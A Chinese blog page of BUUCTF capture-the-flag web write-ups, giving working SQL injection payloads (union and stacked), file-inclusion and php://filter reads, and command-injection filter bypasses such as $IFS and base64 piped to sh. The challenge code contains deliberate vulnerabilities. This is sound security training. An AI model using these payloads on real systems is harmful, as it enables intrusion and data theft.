            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>Links</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/frontback.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="刷题记录"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-05-28 17:47" pubdate>
          May 28, 2025 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          19k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          155 mins
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">刷题记录</h1>
            
            
              <div class="markdown-body">
                
                <p>[TOC]</p>
<h1>BUUCTF</h1>
<h2 id="极客大挑战easysql">极客大挑战easysql</h2>
<p>用户名处尝试万能密码<code>adminxx' or 1=1#</code></p>
<h2 id="极客大挑战Havefun">极客大挑战Havefun</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br>        <span class="hljs-variable">$cat</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$cat</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$cat</span>==<span class="hljs-string">&#x27;dog&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;<br>        &#125;<br>        --&gt;<br></code></pre></td></tr></table></figure>
<p>输入<code>url/?cat=dog</code></p>
<h2 id="HCTF-2018-WarmUp">[HCTF 2018]WarmUp</h2>
<p>代码审计：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-comment">//在该处通过验证</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
<p>函数解释：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br><span class="hljs-comment">#mb_substr()为截取子串函数，第一个参数page是传入的字符串，第二个参数0是开始位置，第三个参数是定位函数，返回第一个？的位置，前将page拼接上?防止报错</span><br></code></pre></td></tr></table></figure>
<p>这里的主要思路是通过checkfile()函数，然后include获得flag文件，需要注意的是，上处的函数只是对传入的file进行检查，截取操作不会对影响原字符串。</p>
<p>构造payload为<code>file=source.php?/../../../../../ffffllllaaaagggg</code>（flag名为hint提示），可以在checkFile的第一处截取的时候赋值page为source.php，从而通过检验第二处的check，返回true。</p>
<p>这里include file时，会将source.php?看成一个文件夹，一步步向上查找。</p>
<h2 id="ACTF2020-新生赛-Include">[ACTF2020 新生赛]Include</h2>
<p>题目如下：</p>
<p>可以看出通过/?file=flag.php读取文件，但在浏览器中显示是经过渲染的，要获得flag必须读取php源码</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744623921115.png" srcset="/img/loading.gif" lazyload alt="1744623921115"></p>
<p>可以利用<code>php://filter/read=xxx/resource=xx</code>协议进行读取，在读取过程中进行base64编码。</p>
<p>payload如下：</p>
<p><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744624432314.png" srcset="/img/loading.gif" lazyload alt="1744624432314"></p>
<h2 id="ACTF2020-新生赛-Exec-ping">[ACTF2020 新生赛]Exec-ping</h2>
<p>ping原理：先对操作系统进行校验，如果是Windos默认ping4次，Linux系统则是现需要手动设置发包次数，传入的ip未作处理，直接拼接到系统命令中，未作任何处理，最后用shell_exec()执行命令，与system()命令类似，可以直接执行系统层面命令。</p>
<h3 id="使用管道符执行多条命令">使用管道符执行多条命令</h3>
<p>在用Linux命令时候，我们可以一行执行多条命令，或者有条件的执行下一条命令。</p>
<ul>
<li><strong>；分号（此命令仅Linux系统特有）</strong></li>
</ul>
<p>在一行内从左向右顺序执行多条命令，无论Command 1是否执行成功，Command 2,3 命令都会执行。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Command 1 ; Command 2[; Command 3...]<br></code></pre></td></tr></table></figure>
<ul>
<li><strong>&amp; 管道操作符</strong></li>
</ul>
<p>在一行内从左向右顺序执行多条命令，无论Command 1是否执行成功，Command 2,3 命令都会执行。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Command 1 &amp; Command 2[&amp; Command3 ...]<br></code></pre></td></tr></table></figure>
<ul>
<li><strong>&amp;&amp; 逻辑与</strong></li>
</ul>
<p>只有Command 1执行成功的情况下，才会执行Command 2,3。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Command 1 &amp;&amp; Command 2[&amp;&amp; Command3 ...]<br></code></pre></td></tr></table></figure>
<ul>
<li><strong>| 管道操作符</strong></li>
</ul>
<p>上一条命令的输出，作为下一条命令的输入(参数)；<br>
<strong>如果下一条命令不需要参数，等于直接执行下一条</strong>；<br>
不管Command 1的执行结果是否正确，Command 2,3 都可以执行。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Command 1 | Command 2 (| Command3)<br></code></pre></td></tr></table></figure>
<ul>
<li><strong>|| 逻辑或</strong></li>
</ul>
<p>只有Command 1执行失败的情况下，才会执行Command 2,3。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Command 1 || Command 2[|| command3 ...]<br></code></pre></td></tr></table></figure>
<h2 id="GXYCTF2019-Ping-Ping-Ping">[GXYCTF2019]Ping Ping Ping</h2>
<p>对输入的命令进行了过滤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bash/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.<span class="hljs-variable">$ip</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>  <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>使用管道符拼接命令：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744724392020.png" srcset="/img/loading.gif" lazyload alt="1744724392020"></p>
<p>1.过滤空格：用一下字符代替</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tex">&lt;&gt;<br>&lt;<br><span class="hljs-built_in">$</span>&#123;IFS&#125;<br><span class="hljs-built_in">$</span>IFS<span class="hljs-built_in">$</span>1<br>&#123;cat,flag.php&#125;<br></code></pre></td></tr></table></figure>
<p>2.过滤关键字：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tex">拼接：cat test.txt  =  a=c;b=at;c=test;d=.txt <span class="hljs-built_in">$</span>a<span class="hljs-built_in">$</span>b <span class="hljs-built_in">$</span>c<span class="hljs-built_in">$</span>d  <span class="hljs-params">##</span>管道符也使用；<br>base64编码:  `echo Y2F0IHRlc3QudHh0|base64 -d`<br>               echo Y2F0IHRlc3QudHh0|base64 -d|bash<br>               echo Y2F0IHRlc3QudHh0|base64 -d|sh<br>单双引号：ca&#x27;&#x27;t tes&quot;&quot;t.txt<br>反斜线：ca<span class="hljs-keyword">\t</span> tes<span class="hljs-keyword">\t</span>.txt<br><span class="hljs-built_in">$</span>符号：ca<span class="hljs-built_in">$</span>@t te<span class="hljs-built_in">$</span>9st.txt<br>cat等价替换：more less head tac tail vim等等……<br>通配符：<br>/???/?at ????.???<br>/???/?[a][t] ????.???<br></code></pre></td></tr></table></figure>
<p>3.长度限制：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tex">（&gt;是写入一个文件，但是内容会清空，&gt;&gt;是在文件末尾追加，<span class="hljs-keyword">\是</span>换行符）<br>echo  &quot;cat<span class="hljs-keyword">\\</span>&quot; &gt; cmd<br>echo &quot;tes<span class="hljs-keyword">\\</span>&quot;&gt;&gt;cmd<br>echo &quot;t.txt&quot;&gt;&gt;cmd<br>sh cmd<br></code></pre></td></tr></table></figure>
<p>方法一：使用<code>$IFS$1</code>过滤空格，对于flag进行关键字拼接不出现 …f…l…a…g…字样，payload如下：</p>
<p><code>/?ip=127.0.0.1；a=alg.php;tac$IFS$1f$a</code></p>
<p>方法二：使用base64编码的方法，答案在源码注释中。</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">`echo<span class="hljs-built_in">$</span>IFS<span class="hljs-built_in">$</span>1Y2F0IGZsYWcucGhw|base64<span class="hljs-built_in">$</span>IFS<span class="hljs-built_in">$</span>1-d`<br>echo<span class="hljs-built_in">$</span>IFS<span class="hljs-built_in">$</span>1Y2F0IGZsYWcucGhw|base64<span class="hljs-built_in">$</span>IFS<span class="hljs-built_in">$</span>1-d|sh<br></code></pre></td></tr></table></figure>
<p>方法三：使用``执行的结果作为输入</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">tac<span class="hljs-built_in">$</span>IFS<span class="hljs-built_in">$</span>1`ls`<br><span class="hljs-params">#</span>相当于tac index.php flag.php<br></code></pre></td></tr></table></figure>
<h2 id="SUCTF-2019-EasySQL">[SUCTF 2019]EasySQL</h2>
<p>关键词字典，判断过滤的内容：</p>
<p>union -&gt;无法进行联合注入；</p>
<p>sleep -&gt;无法进行时间盲注；</p>
<p>or,and-&gt;无法进行布尔盲注</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744795135941.png" srcset="/img/loading.gif" lazyload alt="1744795135941"></p>
<p>这里存在一个现象，只有当；前是非零数字时，才会有回显，后端查询语句为：</p>
<p>**select $_POST[‘a’] || flag from flag；**而且这里字符串||的bool结果为false。</p>
<p>方法一：payload为<code>*,1</code>，查询语句变为<code>select *，(1|| flag)  from flag;</code>等价与<code>select *,1 from flag;</code></p>
<p>方法二：将||从逻辑运算符改为字符串连接符，使用语句<code>set sql_mode=pipes_as_concat</code>，payload设置为<code>1;set sql_mode=pipes_as_concat;select 1</code>，查询语句变为<code>select 1;set sql_mode=pipes_as_concat;select 1||flag from flag;</code>，这里的||相当于concat的作用。</p>
<h2 id="极客大挑战-2019-LoveSQL">[极客大挑战 2019]LoveSQL</h2>
<p>内部查询语句应为：</p>
<p><code>select  xx,xx,xx... where username=$_POST['name'] and password=$_POST['pass']</code></p>
<ol>
<li>尝试是字符型还是数字型：(尝试为字符型)</li>
</ol>
<p>POST：name=<code>1' or 1=1#</code>或者name=<code>1 or 1=1#</code></p>
<ol start="2">
<li>尝试字段数：</li>
</ol>
<p>POST：name=<code>1' order by 1#</code>，1-3报密码错误，4报列不存在，所以字符数为3</p>
<ol start="3">
<li>看回显点：</li>
</ol>
<p>POST：name=<code>1' union select 1,2,3#</code>，根据下图结果，回显点为2,3</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744797037607.png" srcset="/img/loading.gif" lazyload alt="1744797037607"></p>
<ol start="4">
<li>查表名：</li>
</ol>
<p>POST：name=<code>1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()#</code></p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744797333070.png" srcset="/img/loading.gif" lazyload alt="1744797333070"></p>
<ol start="5">
<li>查列名：两个表中都一样</li>
</ol>
<p>POST：name=<code>1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name='l0ve1ysq1'#</code></p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744797550134.png" srcset="/img/loading.gif" lazyload alt="1744797550134"></p>
<ol start="6">
<li>查数据：</li>
</ol>
<p>POST：name=<code>1' union select 1,group_concat(username),group_concat(password) from l0ve1ysq1#</code></p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744797918898.png" srcset="/img/loading.gif" lazyload alt="1744797918898"></p>
<h2 id="极客大挑战-2019-Secret-File">[极客大挑战 2019]Secret File</h2>
<p>通过查看源代码及抓包，得到敏感文件<code>/secr3t.php</code>，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>    &lt;title&gt;secret&lt;/title&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flag放在了flag.php里</span><br><span class="hljs-meta">?&gt;</span><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>代码审计：</p>
<p>string <strong>strstr</strong> (string <code>$haystack</code> , mixed <code>$needle</code>   [, bool <code>$before_needle</code> = false  ] )</p>
<p>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到 <code>haystack</code> 结尾的字符串。</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$email</span>  = <span class="hljs-string">&#x27;name@example.com&#x27;</span>;<br><span class="hljs-variable">$domain</span> = <span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$email</span>, <span class="hljs-string">&#x27;@&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$domain</span>; <span class="hljs-comment">// 打印 @example.com</span><br><br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$email</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 从 PHP 5.3.0 起</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$user</span>; <span class="hljs-comment">// 打印 name</span><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>stristr不区分大小写。</p>
<p>相当于过滤掉了input,data协议，可以使用filter协议，payload如下：</p>
<p><code>url/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>注意传参前的<code>?file</code>不需要加<code>/</code>。</p>
<h2 id="强网杯-2019-随便注">[强网杯 2019]随便注</h2>
<p>首先尝试联合注入那一套：</p>
<ol>
<li>判断字符型还是数字型：根据回显结果，为字符型</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744813020114.png" srcset="/img/loading.gif" lazyload alt="1744813020114"></p>
<ol start="2">
<li>判断字段数：<code>1' order by 3#</code>，经过尝试字段数为2</li>
<li>尝试联合注入：<code>1' union select 1,2#</code>,select字段被过滤</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744813347803.png" srcset="/img/loading.gif" lazyload alt="1744813347803"></p>
<ol start="4">
<li>使用show代替select，并使用堆叠注入：<code>1';show tables;#</code>查看所有表</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744813463967.png" srcset="/img/loading.gif" lazyload alt="1744813463967"></p>
<ol start="5">
<li>查看表结构：<code>1';show columns from 表名;#</code></li>
</ol>
<p>表:1919810931114514，纯数字表名要加``，有一个列flag</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744813693935.png" srcset="/img/loading.gif" lazyload alt="1744813693935"></p>
<p>表：words,有两个列id,name，与开头输入1后的回显内容一致，所以语句会自动回显word表内容。</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744813767594.png" srcset="/img/loading.gif" lazyload alt="1744813767594"></p>
<p>方法一：将words表改名为words1,然后将数字表名改为word,并增加int字段，将flag字段改为data字段。</p>
<p>将words表改名为words1：<code>rename table words to words1;</code></p>
<p>将数字表名改为word：<code>rename table xx to words;</code></p>
<p>word表增加int字段：<code>alter table words add id int unsigned not Null auto_increment primary key;</code></p>
<p>将flag字段改为data字段：<code>alter table words change flag data varchar(100)</code></p>
<p>payload如下：</p>
